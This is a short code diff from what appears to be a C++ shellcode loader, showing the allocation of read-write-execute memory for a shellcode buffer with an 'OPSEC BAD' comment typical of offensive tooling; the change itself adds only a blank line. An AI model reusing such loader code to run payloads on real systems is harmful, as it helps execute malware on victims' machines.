@@ -12658,6 +12658,7 @@ int main(int argc, char* argv[])
 	SIZE_T shellSize = sizeof(shellcode);
 	LPVOID shellAddr = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	// allocating RWX (OPSEC BAD) memory for the shellcode
+
 	if (shellAddr == NULL) {
 		std::cout << "[*] memory couldn't be allocated. " << std::endl;
 		return 0;
